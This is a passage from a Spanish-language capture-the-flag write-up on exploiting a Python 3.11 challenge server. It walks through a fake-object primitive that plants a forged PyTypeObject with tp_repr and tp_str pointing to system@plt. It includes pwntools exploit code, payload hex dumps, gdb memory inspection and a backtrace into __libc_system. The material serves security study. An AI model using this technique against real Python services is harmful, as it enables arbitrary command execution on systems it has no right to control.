b"\x00.py\x00\x00\x00\x00\xb0C\r\xf7\xff\x7f\x00\x00\xc0\xba\x9cUUU\x00\x00@\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xf0\x03\x01\x01\x01\xd8\x00\x04\x80\x04\x80S\x80S\xd0\t\x1f\xd1\x05 \xd4\x05 \xd1\x00!\xd4\x00!\xd0\x00!\xd0\x00!\xd0\x00!\xc3\xbf\xc3\xbf\xc3\xbf\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 D\r\xf7\xff\x7f\x00\x00\xa0Q\x9eUUU\x00\x004\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xe4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'ModuleSpec' object has no attribute '_initializing'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"  
</code></pre></div><p>Como dije, esto puede ser útil para fugar las direcciones de memoria de <code>_ctypes</code>, pero en realidad no se necesitan.</p><h3 id="primitiva-_fake-object_">Primitiva <em>fake object</em></h3><p>La función anterior no era útil para la explotación, pero descubrimos cómo podemos crear <em>fake objects</em> en la memoria y hacer que Python los cargue. Para obtener ejecución de comandos, necesitaremos modificar un puntero de función. Un enfoque es modificar un puntero de función dentro de un <code>PyTypeObject</code> y alterar un método &ldquo;<em>magic/dunder</em>&rdquo; (como se muestra en <a target="_blank" href="https://pwn.win/2022/05/11/python-buffered-reader.html">el artículo</a>).</p><p>Aquí debemos tener en cuenta que <code>print(PyObj_FromPtr(int(addr)))</code> es realmente <code>PyObj_FromPtr(int(addr)).__repr__()</code>, o tal vez primero se transforma a <code>str</code> con <code>PyObj_FromPtr(int(addr)).__str__()</code>. Por lo tanto, la idea es poner en un objeto <code>PyObject</code> un objeto <code>PyTypeObject</code> falso con una función maliciosa en el <em>offset</em> de <code>__repr__</code> o <code>__str__</code> (por ejemplo, <code>system</code>).</p><p>Dado que ya nos hemos saltado PIE, podemos llamar a <code>system</code> con la Tabla de Enlaces de Procedimiento (PLT), por lo que eso no es un problema (usé <a target="_blank" href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a> para obtener la dirección exacta).</p><p>El siguiente código es similar al que se explica en <a target="_blank" href="https://pwn.win/2022/05/11/python-buffered-reader.html">el artículo</a> (disponible <a target="_blank" href="https://github.com/kn32/python-buffered-reader-exploit/blob/master/exploit.py">aquí</a>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">python</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ELF</span><span class="mtk1">(</span><span class="mtk4">'/usr/local/bin/python3.11'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">python</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">python_base_addr</span>

<span class="mtk1">    </span><span class="mtk1">type_obj</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">sp64</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">acdc1337</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'X'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">48</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">sp64</span><span class="mtk1">(</span><span class="mtk1">python</span><span class="mtk1">.</span><span class="mtk1">plt</span><span class="mtk1">.system) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">100</span>  

<span class="mtk1">    </span><span class="mtk1">fake_type_obj_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">add</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk1">type_obj</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">fake_obj_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">add</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk8">sp64</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">11</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">sp64</span><span class="mtk1">(</span><span class="mtk1">fake_type_obj_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">48</span><span class="mtk1">))</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>La función <code>sp64</code> se usa para transformar bytes en <em>strings</em>. Dado que el programa usa <code>input</code>, bytes no ASCII como <code>\x80</code> o <code>\xff</code> se reemplazarán por <code>\xc2\x80</code> y <code>\xc3\xbf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
&gt;&gt;&gt; '\x80'.encode()  
b'\xc2\x80'
&gt;&gt;&gt; '\xff'.encode()
b'\xc3\xbf'
</code></pre></div><p>Entonces esta es la función, muy simple:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">sp64</span><span class="mtk1">(</span><span class="mtk9 mtki">num</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk4">''</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span class="mtk8">chr</span><span class="mtk1">(</span><span class="mtk1">b</span><span class="mtk1">) </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">b</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> p64(</span><span class="mtk9 mtki">num</span><span class="mtk1">)).</span><span class="mtk8">encode</span><span class="mtk1">()</span>  
</code></pre></div><p>Y tenemos esta salida:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-green">+</span>] Starting local process '/usr/local/bin/python3.11' argv=[b'python3.11', b'challenge/server.py'] : pid 850847
[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', '/usr/local/bin/python3.11', '850847', '-x', '/tmp/pwnlxyiopha.gdb']  
[<span class="code-green">+</span>] Waiting for debugger: Done
[<span class="code-red">DEBUG</span>] Received 0x54 bytes:
    b'Zero: 94524412282856\n'
    b'0) Add To Store\n'
    b'1) Remove From Store\n'
    b'2) Load Address\n'
    b'Selection:'
[<span class="code-blue">*</span>] id(0) = 0x55f82e0447e8
[<span class="code-green">+</span>] Python base address: 0x55f82dac7000
[<span class="code-blue">*</span>] '/usr/local/bin/python3.11'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    FORTIFY:  <span class="code-dark-green">Enabled</span>
[<span class="code-red">DEBUG</span>] Sent 0x2 bytes:
    b'0\n'
[<span class="code-red">DEBUG</span>] Received 0x7 bytes:
    b'To Add:'
[<span class="code-red">DEBUG</span>] Sent 0x49f bytes:
    00000000  37 <span class="code-dark-blue">13</span> <span class="code-dark-blue">c3</span> <span class="code-dark-blue">9c</span>  <span class="code-dark-blue">c2</span> <span class="code-dark-blue">ac</span> <span class="code-dark-red">00</span> <span class="code-dark-red">00</span>  <span class="code-dark-red">00</span> <span class="code-dark-red">00</span> 58 58  58 58 58 58  │7<span class="code-dark-blue">···│··</span><span class="code-dark-red">··</span><span class="code-dark-blue">│</span><span class="code-dark-red">··</span>XX<span class="code-dark-blue">│</span>XXXX│
    00000010  58 58 58 58  58 58 58 58  58 58 58 58  58 58 58 58  │XXXX<span class="code-dark-blue">│</span>XXXX<span class="code-dark-blue">│</span>XXXX<span class="code-dark-blue">│</span>XXXX│
    *
    00000050  58 58 <span class="code-dark-blue">c2</span> <span class="code-dark-blue">94</span>  5a <span class="code-dark-blue">c2</span> <span class="code-dark-blue">bb</span> 2d  <span class="code-dark-blue">c3</span> <span class="code-dark-blue">b8</span> 55 <span class="code-dark-red">00</span>  <span class="code-dark-red">00</span> <span class="code-dark-blue">c2</span> <span class="code-dark-blue">94</span> 5a  │XX<span class="code-dark-blue">··│</span>Z<span class="code-dark-blue">··</span>-<span class="code-dark-blue">│··</span>U<span class="code-dark-red">·</span><span class="code-dark-blue">│</span><span class="code-dark-red">·</span><span class="code-dark-blue">··</span>Z│
    00000060  <span class="code-dark-blue">c2</span> <span class="code-dark-blue">bb</span> 2d <span class="code-dark-blue">c3</span>  <span class="code-dark-blue">b8</span> 55 <span class="code-dark-red">00</span> <span class="code-dark-red">00</span>  <span class="code-dark-blue">c2</span> <span class="code-dark-blue">94</span> 5a <span class="code-dark-blue">c2</span>  <span class="code-dark-blue">bb</span> 2d <span class="code-dark-blue">c3</span> <span class="code-dark-blue">b8</span>  │<span class="code-dark-blue">··</span>-<span class="code-dark-blue">·│·</span>U<span class="code-dark-red">··</span><span class="code-dark-blue">│··</span>Z<span class="code-dark-blue">·│·</span>-<span class="code-dark-blue">··</span>│
    ...
    00000430  <span class="code-dark-blue">c2</span> <span class="code-dark-blue">94</span> 5a <span class="code-dark-blue">c2</span>  <span class="code-dark-blue">bb</span> 2d <span class="code-dark-blue">c3</span> <span class="code-dark-blue">b8</span>  55 <span class="code-dark-red">00</span> <span class="code-dark-red">00</span> <span class="code-dark-blue">c2</span>  <span class="code-dark-blue">94</span> 5a <span class="code-dark-blue">c2</span> <span class="code-dark-blue">bb</span>  │<span class="code-dark-blue">··</span>Z<span class="code-dark-blue">·│·</span>-<span class="code-dark-blue">··│</span>U<span class="code-dark-red">··</span><span class="code-dark-blue">·│·</span>Z<span class="code-dark-blue">··</span>│
    00000440  2d <span class="code-dark-blue">c3</span> <span class="code-dark-blue">b8</span> 55  <span class="code-dark-red">00</span> <span class="code-dark-red">00</span> <span class="code-dark-blue">c2</span> <span class="code-dark-blue">94</span>  5a <span class="code-dark-blue">c2</span> <span class="code-dark-blue">bb</span> 2d  <span class="code-dark-blue">c3</span> <span class="code-dark-blue">b8</span> 55 <span class="code-dark-red">00</span>  │-<span class="code-dark-blue">··</span>U<span class="code-dark-blue">│</span><span class="code-dark-red">··</span><span class="code-dark-blue">··│</span>Z<span class="code-dark-blue">··</span>-<span class="code-dark-blue">│··</span>U<span class="code-dark-red">·</span>│
[<span class="code-red">DEBUG</span>] Received 0x63 bytes:
    b'94524420584272\n'
    b'Zero: 94524412282856\n'
    b'0) Add To Store\n'
    b'1) Remove From Store\n'
    b'2) Load Address\n'
    b'Selection:'
[<span class="code-red">DEBUG</span>] Sent 0x2 bytes:
    b'0\n'
[<span class="code-red">DEBUG</span>] Received 0x7 bytes:
    b'To Add:'
[<span class="code-red">DEBUG</span>] Sent 0x15 bytes:
    00000000  <span class="code-dark-blue">11</span> <span class="code-dark-red">00</span> <span class="code-dark-red">00</span> <span class="code-dark-red">00</span>  <span class="code-dark-red">00</span> <span class="code-dark-red">00</span> <span class="code-dark-red">00</span> <span class="code-dark-red">00</span>  <span class="code-dark-blue">c2</span> <span class="code-dark-blue">98</span> <span class="code-dark-blue">c3</span> <span class="code-dark-blue">b3</span>  <span class="code-dark-blue">c2</span> <span class="code-dark-blue">82</span> 2e <span class="code-dark-blue">c3</span>  │<span class="code-dark-blue">·</span><span class="code-dark-red">···</span><span class="code-dark-blue">│</span><span class="code-dark-red">····</span><span class="code-dark-blue">│····│··</span>.<span class="code-dark-blue">·</span>│
    00000010  <span class="code-dark-blue">b8</span> 55 <span class="code-dark-red">00</span> <span class="code-dark-red">00</span>  <span class="code-dark-red">0a</span>                                     │<span class="code-dark-blue">·</span>U<span class="code-dark-red">··</span><span class="code-dark-blue">│</span><span class="code-dark-red">·</span>│
    00000015
[<span class="code-red">DEBUG</span>] Received 0x64 bytes:
    b'140671526391504\n'
    b'Zero: 94524412282856\n'
    b'0) Add To Store\n'
    b'1) Remove From Store\n'
    b'2) Load Address\n'
    b'Selection:'
[<span class="code-blue">*</span>] Switching to interactive mode
Zero: 94524412282856
1) Add To Store
2) Remove From Store
3) Load Address
Selection:<span class="code-red">$</span>
</code></pre></div><p>Y estos son los objetos asignados con los <em>fake objects</em> dentro:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/30gx 94524420584272
<span class="code-dark-blue">0x55f82e82f350</span>: 0x0000000000000001      0x000055f82df581a0
<span class="code-dark-blue">0x55f82e82f360</span>: 0x0000000000000370      0xffffffffffffffff
<span class="code-dark-blue">0x55f82e82f370</span>: 0x0000001a000000a4      0x0000000000000000
<span class="code-dark-blue">0x55f82e82f380</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x55f82e82f390</span>: 0x0000000000000000      0x00000000acdc1337
<span class="code-dark-blue">0x55f82e82f3a0</span>: 0x5858585858585858      0x5858585858585858
<span class="code-dark-blue">0x55f82e82f3b0</span>: 0x5858585858585858      0x5858585858585858
<span class="code-dark-blue">0x55f82e82f3c0</span>: 0x5858585858585858      0x5858585858585858
<span class="code-dark-blue">0x55f82e82f3d0</span>: 0x5858585858585858      0x5858585858585858
<span class="code-dark-blue">0x55f82e82f3e0</span>: 0x5858585858585858      0x000055f82dbb5a94
<span class="code-dark-blue">0x55f82e82f3f0</span>: 0x000055f82dbb5a94      0x000055f82dbb5a94
<span class="code-dark-blue">0x55f82e82f400</span>: 0x000055f82dbb5a94      0x000055f82dbb5a94
<span class="code-dark-blue">0x55f82e82f410</span>: 0x000055f82dbb5a94      0x000055f82dbb5a94
<span class="code-dark-blue">0x55f82e82f420</span>: 0x000055f82dbb5a94      0x000055f82dbb5a94
<span class="code-dark-blue">0x55f82e82f430</span>: 0x000055f82dbb5a94      0x000055f82dbb5a94
<span class="code-green">gef➤  </span>x/30gx 140671526391504
<span class="code-dark-blue">0x7ff0a45c4ed0</span>: 0x0000000000000001      0x000055f82df581a0
<span class="code-dark-blue">0x7ff0a45c4ee0</span>: 0x0000000000000010      0xffffffffffffffff
<span class="code-dark-blue">0x7ff0a45c4ef0</span>: 0x00000000000000a4      0x0000000000000000
<span class="code-dark-blue">0x7ff0a45c4f00</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ff0a45c4f10</span>: 0x0000000000000000      0x0000000000000011
<span class="code-dark-blue">0x7ff0a45c4f20</span>: 0x000055f82e82f398      0x0000000000000000
<span class="code-dark-blue">0x7ff0a45c4f30</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ff0a45c4f40</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ff0a45c4f50</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ff0a45c4f60</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ff0a45c4f70</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ff0a45c4f80</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ff0a45c4f90</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ff0a45c4fa0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ff0a45c4fb0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-green">gef➤  </span>p *(PyObject *) (140671526391504 + 0x48)
$1 = {
  ob_refcnt = 0x11,
  ob_type = <span class="code-dark-blue">0x55f82e82f398</span>
}
<span class="code-green">gef➤  </span>p *(PyTypeObject *) 0x55f82e82f398
$2 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0xacdc1337,
      ob_type = <span class="code-dark-blue">0x5858585858585858</span>
    },
    ob_size = 0x5858585858585858
  },
  tp_name = <span class="code-dark-blue">0x5858585858585858</span> &lt;error: <span class="rb-grey">Cannot access memory at address 0x5858585858585858</span>&gt;,  
  tp_basicsize = 0x5858585858585858,
  tp_itemsize = 0x5858585858585858,
  tp_dealloc = <span class="code-dark-blue">0x5858585858585858</span>,
  tp_vectorcall_offset = 0x5858585858585858,
  tp_getattr = <span class="code-dark-blue">0x5858585858585858</span>,
  tp_setattr = <span class="code-dark-blue">0x5858585858585858</span>,
  tp_as_async = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_repr = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_as_number = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_as_sequence = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_as_mapping = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_hash = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_call = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_str = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_getattro = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_setattro = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_as_buffer = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_flags = 0x55f82dbb5a94,
  tp_doc = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt; "\362\377%-l8",
  tp_traverse = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_clear = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_richcompare = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_weaklistoffset = 0x55f82dbb5a94,
  tp_iter = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_iternext = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_methods = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_members = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_getset = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_base = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_dict = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_descr_get = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_descr_set = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_dictoffset = 0x55f82dbb5a94,
  tp_init = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_alloc = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_new = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_free = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_is_gc = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_bases = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_mro = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_cache = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_subclasses = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_weaklist = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_del = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_version_tag = 0x2dbb5a94,
  tp_finalize = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;,
  tp_vectorcall = <span class="code-dark-blue">0x55f82dbb5a94</span> &lt;<span class="code-dark-yellow">system@plt</span>+4&gt;
}
</code></pre></div><p>Como se puede ver, el <em>fake object</em> de tipo tiene <code>tp_repr</code> y <code>tp_str</code> apuntando a <code>system</code>. Vamos a poner un <em>breakpoint</em> y a ejecutarlo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>break system
Breakpoint 1 at <span class="code-dark-blue">0x7ff0a5049290</span>: file <span class="code-dark-green">../sysdeps/posix/system.c</span>, line 198.  
<span class="code-green">gef➤  </span>p/d (140671526391504 + 0x48)
$3 = 140671526391576
<span class="code-green">gef➤  </span>continue
Continuing.
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Selection:<span class="code-red">$</span> 2
[<span class="code-red">DEBUG</span>] Sent 0x2 bytes:
    b'2\n'
[<span class="code-red">DEBUG</span>] Received 0x8 bytes:  
    b'To Load:'
To Load:<span class="code-red">$</span> 140671526391576
[<span class="code-red">DEBUG</span>] Sent 0x10 bytes:
    b'140671526391576\n'
<span class="code-red">$</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/i $rip
=&gt; <span class="code-dark-blue">0x7ff0a5049290</span> &lt;<span class="code-dark-yellow">__libc_system</span>&gt;:      endbr64
<span class="code-green">gef➤  </span>backtrace
#0  <span class="code-dark-yellow">__libc_system</span> (<span class="code-dark-cyan">line</span>=0x7ff0a45c4f18 "\023") at <span class="code-dark-green">../sysdeps/posix/system.c</span>:198
#1  <span class="code-dark-blue">0x000055f82dc79d77</span> in <span class="code-dark-yellow">PyObject_Str</span> (<span class="code-dark-cyan">v</span>=0x7ff0a45c4f18) at <span class="code-dark-green">./Include/object.h</span>:133
#2  <span class="code-dark-yellow">PyObject_Str</span> (<span class="code-dark-cyan">v</span>=0x7ff0a45c4f18) at <span class="code-dark-green">Objects/object.c</span>:455
#3  <span class="code-dark-blue">0x000055f82dc3a9b5</span> in <span class="code-dark-yellow">PyFile_WriteObject</span> (<span class="code-dark-cyan">v</span>=0x7ff0a45c4f18, <span class="code-dark-cyan">f=f@entry</span>=0x7ff0a472bed0, <span class="code-dark-cyan">flags=flags@entry</span>=0x1) at <span class="code-dark-green">Objects/fileobject.c</span>:129
#4  <span class="code-dark-blue">0x000055f82dd2fef2</span> in <span class="code-dark-yellow">builtin_print_impl</span> (<span class="code-dark-cyan">module</span>=&lt;optimized out&gt;, <span class="code-dark-cyan">flush</span>=0x0, <span class="code-dark-cyan">file</span>=0x7ff0a472bed0, <span class="code-dark-cyan">end</span>=&lt;optimized out&gt;, <span class="code-dark-cyan">sep</span>=&lt;optimized out&gt;, <span class="code-dark-cyan">args</span>=0x7ff0a4716b90) at <span class="code-dark-green">Python/bltinmodule.c</span>:2039
#5  <span class="code-dark-yellow">builtin_print</span> (<span class="code-dark-cyan">module</span>=&lt;optimized out&gt;, <span class="code-dark-cyan">args</span>=&lt;optimized out&gt;, <span class="code-dark-cyan">nargs</span>=&lt;optimized out&gt;, <span class="code-dark-cyan">kwnames</span>=&lt;optimized out&gt;) at <span class="code-dark-green">Python/clinic/bltinmodule.c.h</span>:838
#6  <span class="code-dark-blue">0x000055f82dc76877</span> in <span class="code-dark-yellow">cfunction_vectorcall_FASTCALL_KEYWORDS</span> (<span class="code-dark-cyan">func</span>=0x7ff0a4795670, <span class="code-dark-cyan">args</span>=0x7ff0a5378078, <span class="code-dark-cyan">nargsf</span>=&lt;optimized out&gt;, <span class="code-dark-cyan">kwnames</span>=&lt;optimized out&gt;) at <span class="code-dark-green">./Include/cpython/methodobject.h</span>:52
#7  <span class="code-dark-blue">0x000055f82dc1bbbf</span> in <span class="code-dark-yellow">_PyObject_VectorcallTstate</span> (<span class="code-dark-cyan">kwnames</span>=0x55f82ddc8fba &lt;PyErr_CheckSignals+26&gt;, <span class="code-dark-cyan">nargsf</span>=&lt;optimized out&gt;, <span class="code-dark-cyan">args</span>=0x7ff0a5378078, <span class="code-dark-cyan">callable</span>=0x7ff0a4795670, <span class="code-dark-cyan">tstate</span>=0x55f82e06ce58 &lt;_PyRuntime+166328&gt;) at <span class="code-dark-green">./Include/internal/pycore_call.h</span>:92  
#8  <span class="code-dark-yellow">PyObject_Vectorcall</span> (<span class="code-dark-cyan">callable=callable@entry</span>=0x7ff0a4795670, <span class="code-dark-cyan">args=args@entry</span>=0x7ff0a5378078, <span class="code-dark-cyan">nargsf</span>=&lt;optimized out&gt;, <span class="code-dark-cyan">kwnames=kwnames@entry</span>=0x0) at <span class="code-dark-green">Objects/call.c</span>:299
#9  <span class="code-dark-blue">0x000055f82dbbb22f</span> in <span class="code-dark-yellow">_PyEval_EvalFrameDefault</span> (<span class="code-dark-cyan">tstate</span>=&lt;optimized out&gt;, <span class="code-dark-cyan">frame</span>=&lt;optimized out&gt;, <span class="code-dark-cyan">throwflag</span>=&lt;optimized out&gt;) at <span class="code-dark-green">Python/ceval.c</span>:7314
#10 <span class="code-dark-blue">0x000055f82dd353b5</span> in <span class="code-dark-yellow">_PyEval_EvalFrame</span> (<span class="code-dark-cyan">throwflag</span>=0x0, <span class="code-dark-cyan">frame</span>=0x7ff0a5378020, <span class="code-dark-cyan">tstate</span>=0x55f82e06ce58 &lt;_PyRuntime+166328&gt;) at <span class="code-dark-green">./Include/internal/pycore_ceval.h</span>:73
#11 <span class="code-dark-yellow">_PyEval_Vector</span> (<span class="code-dark-cyan">args</span>=0x0, <span class="code-dark-cyan">argcount</span>=0x0, <span class="code-dark-cyan">kwnames</span>=0x0, <span class="code-dark-cyan">locals</span>=0x7ff0a4802a80, <span class="code-dark-cyan">func</span>=0x7ff0a47ddf80, <span class="code-dark-cyan">tstate</span>=0x55f82e06ce58 &lt;_PyRuntime+166328&gt;) at <span class="code-dark-green">Python/ceval.c</span>:6438
#12 <span class="code-dark-yellow">PyEval_EvalCode</span> (<span class="code-dark-cyan">co=co@entry</span>=0x55f82e836f40, <span class="code-dark-cyan">globals=globals@entry</span>=0x7ff0a4802a80, <span class="code-dark-cyan">locals=locals@entry</span>=0x7ff0a4802a80) at <span class="code-dark-green">Python/ceval.c</span>:1154
#13 <span class="code-dark-blue">0x000055f82dd859a7</span> in <span class="code-dark-yellow">run_eval_code_obj</span> (<span class="code-dark-cyan">locals</span>=0x7ff0a4802a80, <span class="code-dark-cyan">globals</span>=0x7ff0a4802a80, <span class="code-dark-cyan">co</span>=0x55f82e836f40, <span class="code-dark-cyan">tstate</span>=0x55f82e06ce58 &lt;_PyRuntime+166328&gt;) at <span class="code-dark-green">Python/pythonrun.c</span>:1714
